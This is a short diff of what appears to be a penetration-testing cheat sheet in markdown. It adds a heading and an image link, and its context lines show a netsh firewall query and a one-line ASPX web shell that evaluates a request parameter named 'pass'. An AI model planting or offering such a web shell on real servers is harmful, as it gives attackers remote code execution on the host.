@@ -19,3 +19,5 @@ netsh advfirewall firewall show rule name=all dir=in type=dynamic
 ```
 <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
 ```
+# Windows vs Linux Command
+![](https://i.loli.net/2020/05/06/JS1sNIZLQTxURBD.png)
